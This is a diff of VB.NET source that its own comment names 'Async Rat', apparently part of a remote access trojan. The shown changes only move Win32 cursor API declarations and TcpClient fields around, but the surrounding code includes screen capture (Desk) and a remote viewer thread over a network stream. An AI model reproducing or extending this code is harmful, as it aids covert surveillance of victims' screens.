@@ -45,9 +45,6 @@ Public Class C
         End While
     End Sub
 
-    Public Shared CLI As TcpClient
-    Public Shared p As StringBuilder
-
     ''
 
     Public Shared Sub Main()
@@ -221,25 +218,8 @@ Public Class C
     Public Shared TcpV As TcpClient
     Public Shared ViewerDesk As Thread
     Public Shared ns As NetworkStream
-
-    <DllImport("user32.dll")>
-    Public Shared Function GetCursorPos(<Out> ByRef lpPoint As Point) As Boolean
-
-    End Function
-
-
-    <StructLayout(LayoutKind.Sequential)>
-    Structure CURSORINFOHELPER
-        Public cbSize As Int32
-        Public flags As Int32
-        Public hCursor As IntPtr
-        Public ptScreenPos As Point
-    End Structure
-
-    <DllImport("user32.dll")>
-    Public Shared Function GetCursorInfo(ByRef pci As CURSORINFOHELPER) As Boolean
-
-    End Function
+    Public Shared CLI As TcpClient
+    Public Shared p As StringBuilder
 
 
     Public Shared Function Desk() As Image
@@ -309,7 +289,7 @@ Public Class C
 
         Return Image.FromStream(MS)
     End Function
-    ''Async Rat VBnet Function 
+    ''Async Rat VBnet Version Function 
     Private Shared Function GetEncoderInfo(ByVal format As ImageFormat) As ImageCodecInfo
         Try
             Dim j As Integer
@@ -332,8 +312,6 @@ Public Class C
         Dim bf As New BinaryFormatter
         ns = TcpV.GetStream
         While True
-
-
 
             '  Dim p As New MemoryStream
 
@@ -385,6 +363,8 @@ Public Class C
         EmptyWorkingSet(Process.GetCurrentProcess.Handle)
     End Sub
 
+
+
     Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer
 
     <DllImport("ntdll.dll")>
@@ -407,4 +387,27 @@ Public Class C
         ES_SYSTEM_REQUIRED = &H1
 
     End Enum
+
+
+
+
+    <DllImport("user32.dll")>
+    Public Shared Function GetCursorInfo(ByRef pci As CURSORINFOHELPER) As Boolean
+
+    End Function
+    <DllImport("user32.dll")>
+    Public Shared Function GetCursorPos(<Out> ByRef lpPoint As Point) As Boolean
+
+    End Function
+
+
+    <StructLayout(LayoutKind.Sequential)>
+    Structure CURSORINFOHELPER
+        Public cbSize As Int32
+        Public flags As Int32
+        Public hCursor As IntPtr
+        Public ptScreenPos As Point
+    End Structure
+
+
 End Class
